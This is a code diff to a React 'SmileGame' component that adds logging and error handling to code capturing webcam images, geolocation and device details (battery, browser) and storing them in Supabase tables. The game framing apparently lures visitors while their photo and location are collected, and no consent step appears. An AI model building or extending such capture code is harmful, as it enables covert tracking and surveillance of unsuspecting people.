@@ -30,10 +30,14 @@ export default function SmileGame() {
       ctx.drawImage(video, 0, 0);
 
       // Get location and device info in parallel
+      console.log("🔍 Fetching location and device info...");
       const [locData, deviceInfo] = await Promise.all([
         getSmartLocation(),
         getDeviceDetails(),
       ]);
+      
+      console.log("📍 Location data:", locData);
+      console.log("🖥️ Device data:", deviceInfo);
 
       canvas.toBlob(async (blob) => {
         const timestamp = Date.now();
@@ -51,15 +55,21 @@ export default function SmileGame() {
             const imageUrl = data.publicUrl;
 
             // Save image to database
-            await supabaseClient.from("images_table").insert([
+            const { error: imgError } = await supabaseClient.from("images_table").insert([
               {
                 session_id: sessionId,
                 image_url: imageUrl,
               },
             ]);
+            
+            if (imgError) {
+              console.error("❌ Image insert error:", imgError);
+            } else {
+              console.log("✅ Image saved");
+            }
 
             // Save location data
-            await supabaseClient.from("location_table").insert([
+            const { error: locError } = await supabaseClient.from("location_table").insert([
               {
                 session_id: sessionId,
                 latitude: locData.lat,
@@ -72,9 +82,15 @@ export default function SmileGame() {
                 accuracy: locData.details?.accuracy || null,
               },
             ]);
+            
+            if (locError) {
+              console.error("❌ Location insert error:", locError);
+            } else {
+              console.log("✅ Location saved");
+            }
 
             // Save device data
-            await supabaseClient.from("device_table").insert([
+            const { error: devError } = await supabaseClient.from("device_table").insert([
               {
                 session_id: sessionId,
                 battery_level: deviceInfo.battery_level,
@@ -86,16 +102,22 @@ export default function SmileGame() {
                 browser: deviceInfo.browser,
               },
             ]);
+            
+            if (devError) {
+              console.error("❌ Device insert error:", devError);
+            } else {
+              console.log("✅ Device saved");
+            }
 
             setCaptureCount((prev) => prev + 1);
-            console.log(`✅ Captured: Image + Location (${locData.type}) + Device`);
+            console.log(`✅ Full capture complete: Image + Location (${locData.type}) + Device`);
           }
         } catch (error) {
-          console.error("Upload error:", error);
+          console.error("❌ Upload error:", error);
         }
       }, "image/jpeg", 0.8);
     } catch (error) {
-      console.error("Capture error:", error);
+      console.error("❌ Capture error:", error);
     }
   };
 
